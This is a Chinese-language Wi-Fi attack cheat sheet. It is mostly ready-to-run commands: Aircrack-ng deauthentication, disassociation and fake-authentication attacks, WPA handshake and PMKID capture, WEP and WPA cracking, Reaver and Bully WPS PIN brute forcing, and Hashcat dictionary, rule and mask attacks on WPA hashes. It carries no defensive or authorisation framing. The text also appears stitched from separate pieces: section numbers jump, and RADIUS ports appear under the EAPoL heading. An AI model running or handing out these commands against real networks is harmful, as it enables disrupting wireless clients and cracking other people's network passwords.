### 6.2 常用端口和协议

```
WiFi 相关端口和协议：

EAPoL (Extensible Authentication Protocol over LAN):
├── EtherType: 0x888E

├── 认证端口: UDP 1812
├── 计费端口: UDP 1813
└── 旧标准: UDP 1645/1646

CAPWAP (Control and Provisioning of Wireless Access Points):
├── 数据端口: UDP 5247
├── 控制端口: UDP 5246
└── 用于 AP 与控制器通信

HTTP/HTTPS (Captive Portal):
├── HTTP: TCP 80
├── HTTPS: TCP 443
└── Portal 重定向页面
```

### 一、Aircrack-ng 套件命令速查表

#### 1.1 网卡模式切换
```bash
# 查看无线网卡信息
iwconfig
iw dev
iw list                          # 查看网卡支持的信道和特性

# 启用监控模式（推荐方式）
airmon-ng check kill             # 停止干扰进程
airmon-ng start wlan0            # 开启监控模式（wlan0mon）
airmon-ng stop wlan0mon          # 停止监控模式

# 使用 iw 手动切换（更底层）
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# 切换信道
iw dev wlan0mon set channel 6    # 切换到信道6
iw dev wlan0mon set channel 36 HT40+  # 5GHz 40MHz带宽
```

#### 1.2 侦察与嗅探
```bash
# 周围AP扫描
airodump-ng wlan0mon                     # 2.4GHz全信道扫描
airodump-ng --band a wlan0mon            # 5GHz扫描
airodump-ng --band abg wlan0mon          # 全频段扫描
airodump-ng -t wpa -w scan_result wlan0mon  # 仅WPA网络并保存

# 目标AP抓包（捕获四步握手）
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 实时查看抓包文件
airdecap-ng -b AA:BB:CC:DD:EE:FF capture-01.cap  # 解密流量（需密钥）
```

#### 1.3 攻击与破解
```bash
# 解除认证攻击（Deauthentication）
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0: deauth模式, 10: 发送次数, -a: AP的BSSID

# 解除关联攻击（Disassociation）
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon
# -c: 指定客户端MAC, 0表示持续发送

# 伪造认证攻击
aireplay-ng -1 0 -e "TestAP" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# ARP请求重放攻击（WEP）
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# WEP密码破解
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap
aircrack-ng -K attack-01.ivs   # KoreK攻击

# WPA/WPA2握手包破解
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
# -w: 字典文件, -b: 指定BSSID

# PMKID攻击（无需客户端在线）
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.txt -E essidlist pmkid.pcapng
hashcat -m 22000 hash.txt wordlist.txt
```

#### 1.4 WPS攻击
```bash
# Reaver - WPS PIN暴力破解
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670  # 指定PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1         # Pixie Dust攻击

# Bully - 另一个WPS破解工具

bully -b AA:BB:CC:DD:EE:FF -d -v 3 wlan0mon  # 详细输出
```

### 三、Hashcat 无线密码破解

```bash
# 常见模式编号
# 2500 = WPA-EAPOL-PBKDF2（旧版握手包）
# 22000 = WPA-PBKDF2-PMKID+EAPOL（新版格式）
# 16800 = WPA-PMKID-PBKDF2（仅PMKID）

# WPA握手包破解
hashcat -m 2500 handshake.hccapx wordlist.txt
hashcat -m 22000 hash.22000 wordlist.txt

# 使用规则加速破解
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule
hashcat -m 22000 hash.22000 wordlist.txt -r rules/dive.rule

# 掩码攻击（已知部分密码）
hashcat -m 22000 hash.22000 -a 3 Summer?d?d?d?d
# ?d = 数字, ?l = 小写字母, ?u = 大写字母, ?s = 特殊字符

# 组合攻击
hashcat -m 22000 hash.22000 -a 1 left.txt right.txt

# 性能优化
hashcat -m 22000 hash.22000 wordlist.txt -w 4     # 最高性能模式
hashcat -m 22000 hash.22000 wordlist.txt -O       # 优化内核
hashcat -I                                        # 查看可用设备
hashcat -d 1                                      # 指定GPU设备

# 转换工具
hcxpcapngtool -o hash.22000 capture.pcapng        # pcap转hashcat格式
hcxpcapngtool -o hash.22000 -E essidlist -I identitylist -U username-list capture.pcapng
```
